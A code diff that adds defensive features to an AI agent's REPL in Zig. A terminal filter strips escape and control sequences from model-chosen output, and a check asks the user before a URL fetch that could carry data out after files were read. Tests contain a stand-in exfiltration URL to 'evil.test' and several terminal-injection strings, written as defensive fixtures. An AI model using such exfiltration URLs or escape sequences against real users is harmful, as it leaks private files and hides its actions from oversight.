@@ -827,8 +827,118 @@ fn stringArg(args: std.json.Value, key: []const u8) ?[]const u8 {
     return if (v == .string) v.string else null;
 }
 
-/// The one dim line the REPL prints per call.
+/// Filters bytes bound for the user's terminal: text, `\n`, `\t` and valid UTF-8 pass; other control bytes, DEL, C1
+/// and whole ESC sequences are dropped. The state spans calls, so an ESC split across stream deltas is still caught.
+pub const TermFilter = struct {
+    state: enum { text, esc, csi, string } = .text,
+
+    pub fn write(f: *TermFilter, w: *std.Io.Writer, bytes: []const u8) !void {
+        var i: usize = 0;
+        while (i < bytes.len) {
+            const b = bytes[i];
+            switch (f.state) {
+                .text => {
+                    if (b == 0x1b) {
+                        f.state = .esc;
+                        i += 1;
+                    } else if (b < 0x80) {
+                        if ((b >= 0x20 and b != 0x7f) or b == '\n' or b == '\t') try w.writeByte(b);
+                        i += 1;
+                    } else {
+                        const n = std.unicode.utf8ByteSequenceLength(b) catch {
+                            i += 1;
+                            continue;
+                        };
+                        if (i + n > bytes.len or !std.unicode.utf8ValidateSlice(bytes[i..][0..n])) {
+                            i += 1;
+                            continue;
+                        }
+                        // U+0080..U+009F are the C1 controls (CSI, OSC, ...) some terminals still act on.
+                        if (b != 0xC2 or bytes[i + 1] >= 0xA0) try w.writeAll(bytes[i..][0..n]);
+                        i += n;
+                    }
+                },
+                // The byte that ends an unfinished sequence is handled as text, not swallowed.
+                .esc => {
+                    if (b >= 0x20 and b <= 0x2f) {
+                        i += 1;
+                    } else if (b >= 0x30 and b <= 0x7e) {
+                        f.state = if (b == '[') .csi else if (std.mem.indexOfScalar(u8, "]PX^_", b) != null) .string else .text;
+                        i += 1;
+                    } else f.state = .text;
+                },
+                .csi => switch (b) {
+                    0x20...0x3f => i += 1,
+                    0x40...0x7e => {
+                        f.state = .text;
+                        i += 1;
+                    },
+                    else => f.state = .text,
+                },
+                .string => switch (b) {
+                    0x07 => {
+                        f.state = .text;
+                        i += 1;
+                    },
+                    0x1b => {
+                        f.state = .esc;
+                        i += 1;
+                    },
+                    '\n' => f.state = .text,
+                    else => i += 1,
+                },
+            }
+        }
+    }
+};
+
+/// `bytes` through a fresh `TermFilter`, owned.
+pub fn sanitizeForTerminal(allocator: std.mem.Allocator, bytes: []const u8) ![]u8 {
+    var out: std.Io.Writer.Allocating = .init(allocator);
+    errdefer out.deinit();
+    var f: TermFilter = .{};
+    try f.write(&out.writer, bytes);
+    return out.toOwnedSlice();
+}
+
+/// Longest URL path a `fetch_url` may carry without asking, once file content is in the session.
+pub const max_quiet_path = 80;
+
+/// Whether a URL can carry data to its host: a query string or a long path.
+pub fn urlCarriesData(url: []const u8) bool {
+    const sent = url[0 .. std.mem.indexOfScalar(u8, url, '#') orelse url.len];
+    if (std.mem.indexOfScalar(u8, sent, '?') != null) return true;
+    const rest = if (std.mem.indexOf(u8, sent, "://")) |i| sent[i + 3 ..] else sent;
+    const path = rest[std.mem.indexOfScalar(u8, rest, '/') orelse return false ..];
+    return path.len > max_quiet_path;
+}
+
+/// The URL (sanitized, owned) the user must approve before `name` runs, or null when the call needs no asking:
+/// a `fetch_url` that `urlCarriesData`, after a file tool has returned content in this session.
+pub fn fetchNeedingApproval(allocator: std.mem.Allocator, name: []const u8, args_json: []const u8, file_content_seen: bool) !?[]u8 {
+    if (!file_content_seen or !std.mem.eql(u8, name, "fetch_url")) return null;
+    const parsed = std.json.parseFromSlice(std.json.Value, allocator, args_json, .{}) catch return null;
+    defer parsed.deinit();
+    if (parsed.value != .object) return null;
+    const url = stringArg(parsed.value, "url") orelse return null;
+    if (!urlCarriesData(url)) return null;
+    return try sanitizeForTerminal(allocator, url);
+}
+
+/// Tools whose result is local file content.
+pub fn isFileTool(name: []const u8) bool {
+    for ([_][]const u8{ "read_file", "list_dir", "search_files", "view_image" }) |n| if (std.mem.eql(u8, n, name)) return true;
+    return false;
+}
+
+/// The one dim line the REPL prints per call, safe to print: the model chose every byte of it.
 pub fn traceLine(allocator: std.mem.Allocator, name: []const u8, args_json: []const u8) ![]u8 {
+    const raw = try traceLineRaw(allocator, name, args_json);
+    defer allocator.free(raw);
+    return sanitizeForTerminal(allocator, raw);
+}
+
+fn traceLineRaw(allocator: std.mem.Allocator, name: []const u8, args_json: []const u8) ![]u8 {
     const parsed = std.json.parseFromSlice(std.json.Value, allocator, args_json, .{}) catch null;
     defer if (parsed) |p| p.deinit();
     const args: ?std.json.Value = if (parsed) |p| (if (p.value == .object) p.value else null) else null;
@@ -1786,4 +1896,74 @@ test "repl tools: page images expose resolved public-scheme URLs for vision work
     try testing.expect(std.mem.indexOf(u8, text, "Cat & dog (https://example.com/cat.png)") != null);
     try testing.expect(std.mem.indexOf(u8, text, "Bird (https://example.com/news/../bird.jpg)") != null);
     try testing.expect(std.mem.indexOf(u8, text, "data:") == null);
+}
+
+fn filterChunks(allocator: std.mem.Allocator, chunks: []const []const u8) ![]u8 {
+    var out: std.Io.Writer.Allocating = .init(allocator);
+    defer out.deinit();
+    var f: TermFilter = .{};
+    for (chunks) |c| try f.write(&out.writer, c);
+    return out.toOwnedSlice();
+}
+
+test "repl tools: the terminal filter drops escapes and control bytes and keeps text" {
+    const allocator = testing.allocator;
+    const Case = struct { in: []const []const u8, out: []const u8 };
+    for ([_]Case{
+        .{ .in = &.{"fetch: https://a\rhttps://b"}, .out = "fetch: https://ahttps://b" },
+        .{ .in = &.{"x\x1b[2Ky\x1b[1;31mz"}, .out = "xyz" },
+        .{ .in = &.{"\x1b]0;title\x07ok"}, .out = "ok" },
+        .{ .in = &.{"\x1b]8;;http://x\x1b\\link"}, .out = "link" },
+        .{ .in = &.{"a\x1bcb\x1b(Bc"}, .out = "abc" },
+        .{ .in = &.{"a\tb\nc \xc3\xa9 \xe6\x97\xa5\xc2\xa0"}, .out = "a\tb\nc \xc3\xa9 \xe6\x97\xa5\xc2\xa0" },
+        .{ .in = &.{"a\x7fb\x00c\x08d\x07"}, .out = "abcd" },
+        .{ .in = &.{"a\xc2\x9bb\xc2\x85"}, .out = "ab" },
+        .{ .in = &.{"a\xffb\xe6\x97c"}, .out = "abc" },
+        .{ .in = &.{ "a\x1b", "[2", "Kb" }, .out = "ab" },
+        .{ .in = &.{ "a\x1b]0;t", "\x07b" }, .out = "ab" },
+        .{ .in = &.{"\x1b]0;never ends\nnext"}, .out = "\nnext" },
+        .{ .in = &.{"\x1b\nx\x1b"}, .out = "\nx" },
+    }) |c| {
+        const got = try filterChunks(allocator, c.in);
+        defer allocator.free(got);
+        try testing.expectEqualStrings(c.out, got);
+    }
+}
+
+test "repl tools: a trace line cannot rewrite the line it sits on" {
+    const allocator = testing.allocator;
+    const line = try traceLine(allocator, "fetch_url", "{\"url\":\"https://shown.example/\\r\\u001b[2Kother\"}");
+    defer allocator.free(line);
+    try testing.expectEqualStrings("fetch: https://shown.example/other", line);
+    const odd = try traceLine(allocator, "ev\x1b[2Kil", "{}");
+    defer allocator.free(odd);
+    try testing.expectEqualStrings("evil: {}", odd);
+}
+
+test "repl tools: fetch_url asks first when file content is in the session and the url can carry data out" {
+    const allocator = testing.allocator;
+    for ([_][]const u8{
+        "https://ziglang.org/download/",
+        "https://en.wikipedia.org/wiki/Zig_(programming_language)",
+        "https://example.com/#a?b",
+        "https://example.com",
+        "http://example.com:8080/a/b.html",
+    }) |u| try testing.expect(!urlCarriesData(u));
+    for ([_][]const u8{ "https://x.test/?d=abc", "https://x.test/a?b", "https://x.test?q", "https://x.test/p?q#frag" }) |u|
+        try testing.expect(urlCarriesData(u));
+    var long: [15 + max_quiet_path]u8 = undefined;
+    @memcpy(long[0..15], "https://x.test/");
+    @memset(long[15..], 'a');
+    try testing.expect(!urlCarriesData(long[0 .. long.len - 1]));
+    try testing.expect(urlCarriesData(&long));
+
+    const exfil = "{\"url\":\"https://evil.test/?d=secret\\u001b[2K\"}";
+    try testing.expect(try fetchNeedingApproval(allocator, "fetch_url", exfil, false) == null);
+    const shown = (try fetchNeedingApproval(allocator, "fetch_url", exfil, true)).?;
+    defer allocator.free(shown);
+    try testing.expectEqualStrings("https://evil.test/?d=secret", shown);
+    try testing.expect(try fetchNeedingApproval(allocator, "fetch_url", "{\"url\":\"https://ziglang.org/\"}", true) == null);
+    try testing.expect(try fetchNeedingApproval(allocator, "web_search", "{\"query\":\"a?b\"}", true) == null);
+    try testing.expect(try fetchNeedingApproval(allocator, "fetch_url", "not json", true) == null);
+    try testing.expect(isFileTool("read_file") and isFileTool("search_files") and !isFileTool("fetch_url"));
 }
